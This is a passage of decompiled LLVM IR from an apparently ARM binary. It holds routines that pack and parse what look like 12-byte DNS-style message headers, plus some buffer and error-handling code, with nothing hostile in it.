  %v3_14328 = load i32, i32* %v2_14328, align 4
  store i32 %v3_14328, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_17568.621 to i32), i32* %r1.global-to-local, align 4
  %v4_14330 = call i32 @function_d06c(i32 %v0_142fc, i32 ptrtoint ([3 x i8]* @global_var_17568.621 to i32), i32 %v3_14328)
  %v0_14334 = load i32, i32* @r4, align 4
  %v2_14334 = add i32 %v0_14334, %v4_14330
  store i32 %v2_14334, i32* @r4, align 4
  br label %dec_label_pc_14338

dec_label_pc_14338:                               ; preds = %dec_label_pc_142a0, %bb51, %dec_label_pc_1431c
  %v3_142a824 = phi i32 [ %v3_142b864, %dec_label_pc_142a0 ], [ %v6_142a8, %bb51 ], [ %v2_14334, %dec_label_pc_1431c ]
  %v0_14338 = load i32, i32* @r5, align 4
  %v1_14338 = add i32 %v0_14338, 1
  %v0_14284.pre = load i32, i32* @r6, align 4
  store i32 %v1_14338, i32* @r5, align 4
  %v7_14340 = icmp slt i32 %v1_14338, 8
  %v7_14284 = icmp eq i32 %v0_14284.pre, -1
  br i1 %v7_14340, label %dec_label_pc_14284, label %dec_label_pc_14344

dec_label_pc_14344:                               ; preds = %dec_label_pc_14338
  br i1 %v7_14284, label %.thread4, label %dec_label_pc_1434c

dec_label_pc_1434c:                               ; preds = %dec_label_pc_14344, %dec_label_pc_1430c
  %v3_14358 = phi i32 [ %v3_142a824, %dec_label_pc_14344 ], [ %v2_14314, %dec_label_pc_1430c ]
  %v0_1434c = phi i32 [ %v0_14284.pre, %dec_label_pc_14344 ], [ %v0_1434c.pre, %dec_label_pc_1430c ]
  %v1_1434c = load i32, i32* @r7, align 4
  %v2_1434c = add i32 %v1_1434c, %v0_1434c
  %v7_14350 = icmp eq i32 %v2_1434c, 8
  br i1 %v7_14350, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_1434c
  %v4_14358 = inttoptr i32 %v3_14358 to i8*
  store i8 58, i8* %v4_14358, align 1
  %v5_14358 = load i32, i32* @r4, align 4
  %v6_14358 = add i32 %v5_14358, 1
  store i32 %v6_14358, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1434c, %dec_label_pc_14344, %bb53
  %v2_14360 = phi i32 [ %v3_14358, %dec_label_pc_1434c ], [ %v3_142a824, %dec_label_pc_14344 ], [ %v6_14358, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_14360 = inttoptr i32 %v2_14360 to i8*
  store i8 0, i8* %v3_14360, align 1
  %v4_14360 = load i32, i32* @r4, align 4
  %v5_14360 = add i32 %v4_14360, 1
  store i32 %v2_14278, i32* %r1.global-to-local, align 4
  %v2_14368 = sub i32 %v5_14360, %v2_14278
  %v1_1436c = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_14368, %v1_1436c
  br i1 %tmp69, label %dec_label_pc_14374, label %dec_label_pc_14388

dec_label_pc_14374:                               ; preds = %.thread4
  %v0_14374 = call i32 @function_cec4()
  %v0_1437c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1437c, i32* %r2.global-to-local, align 4
  %v2_14380 = inttoptr i32 %v0_14374 to i32*
  store i32 28, i32* %v2_14380, align 4
  %v0_143a8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_143a8

dec_label_pc_14388:                               ; preds = %.thread4
  %v0_14388 = load i32, i32* @sb, align 4
  %v2_1438c = bitcast i32* %stack_var_-110 to i8*
  %v3_1438c = call i32 @function_f090(i32 %v0_14388, i8* %v2_1438c)
  br label %dec_label_pc_14390

dec_label_pc_14390:                               ; preds = %dec_label_pc_142ec, %dec_label_pc_14184, %dec_label_pc_14388
  %v0_14390 = phi i32 [ 0, %dec_label_pc_142ec ], [ %v3_14190, %dec_label_pc_14184 ], [ %v3_1438c, %dec_label_pc_14388 ]
  store i32 %v0_14390, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_143a8

dec_label_pc_14398:                               ; preds = %dec_label_pc_14178
  %v0_14398 = call i32 @function_cec4()
  %v2_143a0 = inttoptr i32 %v0_14398 to i32*
  store i32 97, i32* %v2_143a0, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_143a8

dec_label_pc_143a8:                               ; preds = %dec_label_pc_14390, %dec_label_pc_14374, %dec_label_pc_14398
  %v0_143a8 = phi i32 [ %v0_14390, %dec_label_pc_14390 ], [ %v0_143a8.pre, %dec_label_pc_14374 ], [ 0, %dec_label_pc_14398 ]
  store i32 %v6_1415c, i32* %r5.global-to-local, align 4
  ret i32 %v0_143a8

; uselistorder directives
  uselistorder i1 %v7_14284, { 1, 0 }
  uselistorder i32 %v0_14284.pre, { 1, 0, 2 }
  uselistorder i32 %v1_14338, { 1, 0, 2 }
  uselistorder i32 %v0_142fc, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_142b864, { 0, 3, 2, 1 }
  uselistorder i32 %v1_142a065, { 2, 0, 1 }
  uselistorder i32 %v0_142b066, { 3, 2, 0, 1 }
  uselistorder i32 %v2_14278, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1428423, { 1, 0 }
  uselistorder i32 %v0_14268, { 1, 2, 0 }
  uselistorder i32 %v1_1423c, { 1, 2, 0 }
  uselistorder i32 %v0_14250, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14264, { 1, 2, 0, 3 }
  uselistorder i1 %v7_14204, { 1, 0 }
  uselistorder i32 %v0_1423c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_14220, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_14230, { 3, 1, 0, 2 }
  uselistorder i32 %v2_141d4, { 2, 1, 0 }
  uselistorder i32 %v1_141b4, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_1415c, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 8, 6, 7, 0 }
  uselistorder i32 97, { 2, 3, 6, 0, 1, 7, 4, 5 }
  uselistorder i32 (i32, i8*)* @function_f090, { 0, 7, 1, 2, 3, 4, 5, 6, 8, 9 }
  uselistorder i32 (i32, i32, i32)* @function_d06c, { 1, 0 }
  uselistorder i32 (i8*, i32)* @function_ef70, { 5, 6, 4, 9, 10, 7, 15, 13, 14, 8, 0, 1, 2, 3, 11, 12 }
  uselistorder i32 (i32, i32, i32)* @function_13ff8, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_143a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14390, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14338, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_14284, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14268, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14260, { 1, 0 }
  uselistorder label %dec_label_pc_1423c, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14238, { 1, 0 }
  uselistorder label %dec_label_pc_141f0, { 1, 0 }
  uselistorder label %dec_label_pc_141c4, { 1, 0 }
}

define i32 @function_143bc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_143bc:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_143c0 = load i32, i32* @r4, align 4
  store i32 %v3_143c0, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_143d0 = icmp sgt i32 %arg3, 11
  br i1 %v7_143d0, label %dec_label_pc_143d4, label %dec_label_pc_1449c

dec_label_pc_143d4:                               ; preds = %dec_label_pc_143bc
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_143d4 = add i32 %tmp, 1
  %v2_143d4 = inttoptr i32 %v1_143d4 to i8*
  %v3_143d4 = load i8, i8* %v2_143d4, align 1
  store i8 %v3_143d4, i8* %tmp18, align 1
  %v2_143dc = load i32, i32* %arg1, align 4
  %v1_143e0 = trunc i32 %v2_143dc to i8
  %v4_143e0 = add i32 %arg2, 1
  %v5_143e0 = inttoptr i32 %v4_143e0 to i8*
  store i8 %v1_143e0, i8* %v5_143e0, align 1
  %v0_143e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_143e4 = add i32 %v0_143e4, 12
  %v2_143e4 = inttoptr i32 %v1_143e4 to i32*
  %v3_143e4 = load i32, i32* %v2_143e4, align 4
  %v1_143e8 = add i32 %v0_143e4, 4
  %v2_143e8 = inttoptr i32 %v1_143e8 to i32*
  %v3_143e8 = load i32, i32* %v2_143e8, align 4
  %v1_143ec = add i32 %v0_143e4, 16
  %v2_143ec = inttoptr i32 %v1_143ec to i32*
  %v3_143ec = load i32, i32* %v2_143ec, align 4
  %v1_143f0 = add i32 %tmp, 8
  %v2_143f0 = inttoptr i32 %v1_143f0 to i32*
  %v3_143f0 = load i32, i32* %v2_143f0, align 4
  %v2_143f4 = icmp eq i32 %v3_143e4, 0
  %. = select i1 %v2_143f4, i32 0, i32 4
  %v2_14400 = icmp eq i32 %v3_143e8, 0
  %v1_14404 = add i32 %v0_143e4, 20
  %v2_14404 = inttoptr i32 %v1_14404 to i32*
  %v3_14404 = load i32, i32* %v2_14404, align 4
  %storemerge12 = select i1 %v2_14400, i32 0, i32 128
  %v1_14410 = urem i32 %v3_143f0, 16
  %v2_14414 = icmp eq i32 %v3_143ec, 0
  %.29 = select i1 %v2_14414, i32 0, i32 2
  %v4_14420 = mul nuw nsw i32 %v1_14410, 8
  %v5_14420 = or i32 %v4_14420, %.
  %v2_14424 = icmp eq i32 %v3_14404, 0
  br i1 %v2_14424, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_143d4
  %v2_14428 = or i32 %v5_14420, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_143d4, %bb25
  %v1_14430 = phi i32 [ %v5_14420, %dec_label_pc_143d4 ], [ %v2_14428, %bb25 ]
  %v2_1442c = or i32 %.29, %storemerge12
  %v2_14430 = or i32 %v2_1442c, %v1_14430
  %v1_14434 = trunc i32 %v2_14430 to i8
  %v2_14434 = load i32, i32* %r4.global-to-local, align 4
  %v3_14434 = add i32 %v2_14434, 2
  %v4_14434 = inttoptr i32 %v3_14434 to i8*
  store i8 %v1_14434, i8* %v4_14434, align 1
  %v0_14438 = load i32, i32* %lr.global-to-local, align 4
  %v1_14438 = add i32 %v0_14438, 24
  %v1_1443c = inttoptr i32 %v1_14438 to i32*
  %v2_1443c = load i32, i32* %v1_1443c, align 4
  %v3_1443c = add i32 %v0_14438, 28
  %v4_1443c = inttoptr i32 %v3_1443c to i32*
  %v5_1443c = load i32, i32* %v4_1443c, align 4
  %v2_14440 = icmp eq i32 %v2_1443c, 0
  %v1_14444 = urem i32 %v5_1443c, 16
  %.30 = select i1 %v2_14440, i32 0, i32 128
  %v2_14450 = or i32 %v1_14444, %.30
  %v1_14454 = trunc i32 %v2_14450 to i8
  %v2_14454 = load i32, i32* %r4.global-to-local, align 4
  %v3_14454 = add i32 %v2_14454, 3
  %v4_14454 = inttoptr i32 %v3_14454 to i8*
  store i8 %v1_14454, i8* %v4_14454, align 1
  %v0_14458 = load i32, i32* %lr.global-to-local, align 4
  %v1_14458 = add i32 %v0_14458, 33
  %v2_14458 = inttoptr i32 %v1_14458 to i8*
  %v3_14458 = load i8, i8* %v2_14458, align 1
  %v2_1445c = load i32, i32* %r4.global-to-local, align 4
  %v3_1445c = add i32 %v2_1445c, 4
  %v4_1445c = inttoptr i32 %v3_1445c to i8*
  store i8 %v3_14458, i8* %v4_1445c, align 1
  %v0_14460 = load i32, i32* %lr.global-to-local, align 4
  %v1_14460 = add i32 %v0_14460, 32
  %v2_14460 = inttoptr i32 %v1_14460 to i32*
  %v3_14460 = load i32, i32* %v2_14460, align 4
  %v1_14464 = trunc i32 %v3_14460 to i8
  %v2_14464 = load i32, i32* %r4.global-to-local, align 4
  %v3_14464 = add i32 %v2_14464, 5
  %v4_14464 = inttoptr i32 %v3_14464 to i8*
  store i8 %v1_14464, i8* %v4_14464, align 1
  %v0_14468 = load i32, i32* %lr.global-to-local, align 4
  %v1_14468 = add i32 %v0_14468, 37
  %v2_14468 = inttoptr i32 %v1_14468 to i8*
  %v3_14468 = load i8, i8* %v2_14468, align 1
  %v2_1446c = load i32, i32* %r4.global-to-local, align 4
  %v3_1446c = add i32 %v2_1446c, 6
  %v4_1446c = inttoptr i32 %v3_1446c to i8*
  store i8 %v3_14468, i8* %v4_1446c, align 1
  %v0_14470 = load i32, i32* %lr.global-to-local, align 4
  %v1_14470 = add i32 %v0_14470, 36
  %v2_14470 = inttoptr i32 %v1_14470 to i32*
  %v3_14470 = load i32, i32* %v2_14470, align 4
  %v1_14474 = trunc i32 %v3_14470 to i8
  %v2_14474 = load i32, i32* %r4.global-to-local, align 4
  %v3_14474 = add i32 %v2_14474, 7
  %v4_14474 = inttoptr i32 %v3_14474 to i8*
  store i8 %v1_14474, i8* %v4_14474, align 1
  %v0_14478 = load i32, i32* %lr.global-to-local, align 4
  %v1_14478 = add i32 %v0_14478, 41
  %v2_14478 = inttoptr i32 %v1_14478 to i8*
  %v3_14478 = load i8, i8* %v2_14478, align 1
  %v2_1447c = load i32, i32* %r4.global-to-local, align 4
  %v3_1447c = add i32 %v2_1447c, 8
  %v4_1447c = inttoptr i32 %v3_1447c to i8*
  store i8 %v3_14478, i8* %v4_1447c, align 1
  %v0_14480 = load i32, i32* %lr.global-to-local, align 4
  %v1_14480 = add i32 %v0_14480, 40
  %v2_14480 = inttoptr i32 %v1_14480 to i32*
  %v3_14480 = load i32, i32* %v2_14480, align 4
  %v1_14484 = trunc i32 %v3_14480 to i8
  %v2_14484 = load i32, i32* %r4.global-to-local, align 4
  %v3_14484 = add i32 %v2_14484, 9
  %v4_14484 = inttoptr i32 %v3_14484 to i8*
  store i8 %v1_14484, i8* %v4_14484, align 1
  %v0_14488 = load i32, i32* %lr.global-to-local, align 4
  %v1_14488 = add i32 %v0_14488, 45
  %v2_14488 = inttoptr i32 %v1_14488 to i8*
  %v3_14488 = load i8, i8* %v2_14488, align 1
  %v2_1448c = load i32, i32* %r4.global-to-local, align 4
  %v3_1448c = add i32 %v2_1448c, 10
  %v4_1448c = inttoptr i32 %v3_1448c to i8*
  store i8 %v3_14488, i8* %v4_1448c, align 1
  %v0_14490 = load i32, i32* %lr.global-to-local, align 4
  %v1_14490 = add i32 %v0_14490, 44
  %v2_14490 = inttoptr i32 %v1_14490 to i32*
  %v3_14490 = load i32, i32* %v2_14490, align 4
  %v1_14494 = trunc i32 %v3_14490 to i8
  %v2_14494 = load i32, i32* %r4.global-to-local, align 4
  %v3_14494 = add i32 %v2_14494, 11
  %v4_14494 = inttoptr i32 %v3_14494 to i8*
  store i8 %v1_14494, i8* %v4_14494, align 1
  %v2_144a0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1449c

dec_label_pc_1449c:                               ; preds = %dec_label_pc_143bc, %bb26
  %v2_144a0 = phi i32 [ %v3_143c0, %dec_label_pc_143bc ], [ %v2_144a0.pre, %bb26 ]
  %v0_1449c = phi i32 [ -1, %dec_label_pc_143bc ], [ 12, %bb26 ]
  store i32 %v2_144a0, i32* @r4, align 4
  ret i32 %v0_1449c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1449c, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @function_144a4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_144a4:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_144a4 = load i8, i8* %arg1, align 1
  %v4_144a4 = zext i8 %v3_144a4 to i32
  %v2_144a8 = add i32 %tmp, 1
  %v3_144a8 = inttoptr i32 %v2_144a8 to i8*
  %v4_144a8 = load i8, i8* %v3_144a8, align 1
  %v5_144a8 = zext i8 %v4_144a8 to i32
  %v4_144ac = mul nuw nsw i32 %v4_144a4, 256
  %v5_144ac = or i32 %v5_144a8, %v4_144ac
  %v2_144b0 = inttoptr i32 %arg2 to i32*
  store i32 %v5_144ac, i32* %v2_144b0, align 4
  %v2_144b4 = add i32 %tmp, 2
  %v3_144b4 = inttoptr i32 %v2_144b4 to i8*
  %v4_144b4 = load i8, i8* %v3_144b4, align 1
  %tmp4 = icmp slt i8 %v4_144b4, 0
  %v3_144b8 = zext i1 %tmp4 to i32
  %v2_144bc = add i32 %arg2, 4
  %v3_144bc = inttoptr i32 %v2_144bc to i32*
  store i32 %v3_144b8, i32* %v3_144bc, align 4
  %v4_144c0 = load i8, i8* %v3_144b4, align 1
  %div = udiv i8 %v4_144c0, 8
  %tmp5 = urem i8 %div, 16
  %v1_144c8 = zext i8 %tmp5 to i32
  %v2_144cc = add i32 %arg2, 8
  %v3_144cc = inttoptr i32 %v2_144cc to i32*
  store i32 %v1_144c8, i32* %v3_144cc, align 4
  %v4_144d0 = load i8, i8* %v3_144b4, align 1
  %div1 = udiv i8 %v4_144d0, 4
  %tmp6 = urem i8 %div1, 2
  %v1_144d8 = zext i8 %tmp6 to i32
  %v2_144dc = add i32 %arg2, 12
  %v3_144dc = inttoptr i32 %v2_144dc to i32*
  store i32 %v1_144d8, i32* %v3_144dc, align 4
  %v4_144e0 = load i8, i8* %v3_144b4, align 1
  %div2 = udiv i8 %v4_144e0, 2
  %tmp7 = urem i8 %div2, 2
  %v1_144e8 = zext i8 %tmp7 to i32
  %v2_144ec = add i32 %arg2, 16
  %v3_144ec = inttoptr i32 %v2_144ec to i32*
  store i32 %v1_144e8, i32* %v3_144ec, align 4
  %v4_144f0 = load i8, i8* %v3_144b4, align 1
  %tmp8 = urem i8 %v4_144f0, 2
  %v1_144f4 = zext i8 %tmp8 to i32
  %v2_144f8 = add i32 %arg2, 20
  %v3_144f8 = inttoptr i32 %v2_144f8 to i32*
  store i32 %v1_144f4, i32* %v3_144f8, align 4
  %v2_144fc = add i32 %tmp, 3
  %v3_144fc = inttoptr i32 %v2_144fc to i8*
  %v4_144fc = load i8, i8* %v3_144fc, align 1
  %tmp9 = icmp slt i8 %v4_144fc, 0
  %v3_14500 = zext i1 %tmp9 to i32
  %v2_14504 = add i32 %arg2, 24
  %v3_14504 = inttoptr i32 %v2_14504 to i32*
  store i32 %v3_14500, i32* %v3_14504, align 4
  %v4_14508 = load i8, i8* %v3_144fc, align 1
  %tmp10 = urem i8 %v4_14508, 16
  %v1_1450c = zext i8 %tmp10 to i32
  %v2_14510 = add i32 %arg2, 28
  %v3_14510 = inttoptr i32 %v2_14510 to i32*
  store i32 %v1_1450c, i32* %v3_14510, align 4
  %v2_14514 = add i32 %tmp, 4
  %v3_14514 = inttoptr i32 %v2_14514 to i8*
  %v4_14514 = load i8, i8* %v3_14514, align 1
  %v5_14514 = zext i8 %v4_14514 to i32
  %v2_14518 = add i32 %tmp, 5
  %v3_14518 = inttoptr i32 %v2_14518 to i8*
  %v4_14518 = load i8, i8* %v3_14518, align 1
  %v5_14518 = zext i8 %v4_14518 to i32
  %v4_1451c = mul nuw nsw i32 %v5_14514, 256
  %v5_1451c = or i32 %v5_14518, %v4_1451c
  %v2_14520 = add i32 %arg2, 32
  %v3_14520 = inttoptr i32 %v2_14520 to i32*
  store i32 %v5_1451c, i32* %v3_14520, align 4
  %v2_14524 = add i32 %tmp, 6
  %v3_14524 = inttoptr i32 %v2_14524 to i8*
  %v4_14524 = load i8, i8* %v3_14524, align 1
  %v5_14524 = zext i8 %v4_14524 to i32
  %v2_14528 = add i32 %tmp, 7
  %v3_14528 = inttoptr i32 %v2_14528 to i8*
  %v4_14528 = load i8, i8* %v3_14528, align 1
  %v5_14528 = zext i8 %v4_14528 to i32
  %v4_1452c = mul nuw nsw i32 %v5_14524, 256
  %v5_1452c = or i32 %v5_14528, %v4_1452c
  %v2_14530 = add i32 %arg2, 36
  %v3_14530 = inttoptr i32 %v2_14530 to i32*
  store i32 %v5_1452c, i32* %v3_14530, align 4
  %v2_14534 = add i32 %tmp, 8
  %v3_14534 = inttoptr i32 %v2_14534 to i8*
  %v4_14534 = load i8, i8* %v3_14534, align 1
  %v5_14534 = zext i8 %v4_14534 to i32
  %v2_14538 = add i32 %tmp, 9
  %v3_14538 = inttoptr i32 %v2_14538 to i8*
  %v4_14538 = load i8, i8* %v3_14538, align 1
  %v5_14538 = zext i8 %v4_14538 to i32
  %v4_1453c = mul nuw nsw i32 %v5_14534, 256
  %v5_1453c = or i32 %v5_14538, %v4_1453c
  %v2_14540 = add i32 %arg2, 40
  %v3_14540 = inttoptr i32 %v2_14540 to i32*
  store i32 %v5_1453c, i32* %v3_14540, align 4
  %v2_14544 = add i32 %tmp, 11
  %v3_14544 = inttoptr i32 %v2_14544 to i8*
  %v4_14544 = load i8, i8* %v3_14544, align 1
  %v5_14544 = zext i8 %v4_14544 to i32
  %v2_14548 = add i32 %tmp, 10
  %v3_14548 = inttoptr i32 %v2_14548 to i8*
  %v4_14548 = load i8, i8* %v3_14548, align 1
  %v5_14548 = zext i8 %v4_14548 to i32
  %v4_14550 = mul nuw nsw i32 %v5_14548, 256
  %v5_14550 = or i32 %v4_14550, %v5_14544
  %v2_14554 = add i32 %arg2, 44
  %v3_14554 = inttoptr i32 %v2_14554 to i32*
  store i32 %v5_14550, i32* %v3_14554, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 8, 9, 3, 4, 5, 6, 10, 1, 2, 11, 12, 13, 14, 15, 0, 7 }
  uselistorder i32 40, { 5, 6, 8, 7, 1, 14, 2, 0, 9, 10, 11, 12, 13, 4, 3 }
  uselistorder i32 28, { 10, 4, 5, 6, 27, 18, 31, 11, 13, 7, 12, 1, 19, 9, 2, 14, 28, 29, 15, 16, 20, 21, 22, 23, 24, 25, 0, 26, 8, 30, 3, 17 }
  uselistorder i8 2, { 0, 1, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @function_1455c(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1455c:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1455c = load i32, i32* @r4, align 4
  store i32 %v3_1455c, i32* %stack_var_-16, align 4
  %v6_1455c = load i32, i32* @r5, align 4
  %v9_1455c = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_14564 = load i32, i32* %arg1, align 4
  store i32 %v2_14564, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_14570 = inttoptr i32 %v2_14564 to i8*
  %v2_14570 = call i32 @function_14bd0(i8* %v1_14570)
  store i32 %v2_14570, i32* %r0.global-to-local, align 4
  %v1_14574 = icmp slt i32 %v2_14570, 0
  br i1 %v1_14574, label %bb, label %bb6

bb:                                               ; preds = %dec_label_pc_1455c
  %v5_1457c = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_1457c, i32* @r4, align 4
  store i32 %v6_1455c, i32* @r5, align 4
  store i32 %v9_1455c, i32* @r6, align 4
  ret i32 %v2_14570

bb6:                                              ; preds = %dec_label_pc_1455c
  %v1_14578 = load i32, i32* @r4, align 4
  %v2_14578 = sub i32 %v1_14578, %v2_14570
  %v0_14584 = load i32, i32* @r6, align 4
  %v2_14584 = add i32 %v0_14584, %v2_14570
  store i32 %v2_14584, i32* %r2.global-to-local, align 4
  %v7_14588 = icmp sgt i32 %v2_14578, 3
  br i1 %v7_14588, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_1458c = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_1458c, i32* @r4, align 4
  store i32 %v6_1455c, i32* @r5, align 4
  store i32 %v9_1455c, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_14590 = load i32, i32* @r5, align 4
  %v1_14590 = add i32 %v0_14590, 5
  %v2_14590 = inttoptr i32 %v1_14590 to i8*
  %v3_14590 = load i8, i8* %v2_14590, align 1
  %v5_14594 = inttoptr i32 %v2_14584 to i8*
  store i8 %v3_14590, i8* %v5_14594, align 1
  %v0_14598 = load i32, i32* @r5, align 4
  %v1_14598 = add i32 %v0_14598, 4
  %v2_14598 = inttoptr i32 %v1_14598 to i32*
  %v3_14598 = load i32, i32* %v2_14598, align 4
  %v1_1459c = trunc i32 %v3_14598 to i8
  %v2_1459c = load i32, i32* %r2.global-to-local, align 4
  %v3_1459c = add i32 %v2_1459c, 1
  %v4_1459c = inttoptr i32 %v3_1459c to i8*
  store i8 %v1_1459c, i8* %v4_1459c, align 1
  %v0_145a0 = load i32, i32* @r5, align 4
  %v1_145a0 = add i32 %v0_145a0, 9
  %v2_145a0 = inttoptr i32 %v1_145a0 to i8*
  %v3_145a0 = load i8, i8* %v2_145a0, align 1
  %v2_145a4 = load i32, i32* %r2.global-to-local, align 4
  %v3_145a4 = add i32 %v2_145a4, 2
  %v4_145a4 = inttoptr i32 %v3_145a4 to i8*
  store i8 %v3_145a0, i8* %v4_145a4, align 1
  %v0_145a8 = load i32, i32* @r5, align 4
  %v1_145a8 = add i32 %v0_145a8, 8
  %v2_145a8 = inttoptr i32 %v1_145a8 to i32*
  %v3_145a8 = load i32, i32* %v2_145a8, align 4
  %v0_145ac = load i32, i32* %r0.global-to-local, align 4
  %v1_145ac = add i32 %v0_145ac, 4
  store i32 %v1_145ac, i32* %r0.global-to-local, align 4
  %v1_145b0 = trunc i32 %v3_145a8 to i8
  %v2_145b0 = load i32, i32* %r2.global-to-local, align 4
  %v3_145b0 = add i32 %v2_145b0, 3
  %v4_145b0 = inttoptr i32 %v3_145b0 to i8*
  store i8 %v1_145b0, i8* %v4_145b0, align 1
  %v2_145b4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_145b4, i32* @r4, align 4
  store i32 %v6_1455c, i32* @r5, align 4
  store i32 %v9_1455c, i32* @r6, align 4
  ret i32 %v1_145ac

; uselistorder directives
  uselistorder i32 %v2_14570, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_1455c, { 1, 0, 2 }
  uselistorder i32 %v6_1455c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 4, 2, 5, 0 }
}

define i32 @function_145b8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_145b8:
  %v0_145bc = call i32 @function_14d44()
  %v1_145c0 = icmp slt i32 %v0_145bc, 0
  br i1 %v1_145c0, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_145b8
  %v4_145c4 = add i32 %v0_145bc, 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_145b8, %bb
  %v5_145c8 = phi i32 [ %v0_145bc, %dec_label_pc_145b8 ], [ %v4_145c4, %bb ]
  ret i32 %v5_145c8

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_145cc(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
dec_label_pc_145cc:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_145cc = load i32, i32* @r4, align 4
  %v6_145cc = load i32, i32* @r5, align 4
  %v9_145cc = load i32, i32* @r6, align 4
  %v12_145cc = load i32, i32* @r7, align 4
  %v21_145cc = load i32, i32* @sl, align 4
  %v2_145d0 = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_145d0, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_145ec = call i32 @function_14c78()
  store i32 %v0_145ec, i32* %r0.global-to-local, align 4
  store i32 %v0_145ec, i32* @r7, align 4
  %v1_145f0 = icmp slt i32 %v0_145ec, 0
  %v0_145f4 = load i32, i32* @r4, align 4
  %v2_145f4 = add i32 %v0_145f4, %v0_145ec
  store i32 %v2_145f4, i32* %r8.global-to-local, align 4
  br i1 %v1_145f0, label %bb14, label %dec_label_pc_14604

dec_label_pc_14604:                               ; preds = %dec_label_pc_145cc
  %v1_145fc = load i32, i32* @r5, align 4
  %v2_145fc = sub i32 %v1_145fc, %v2_145f4
  %v1_14604 = add i32 %v2_145fc, -10
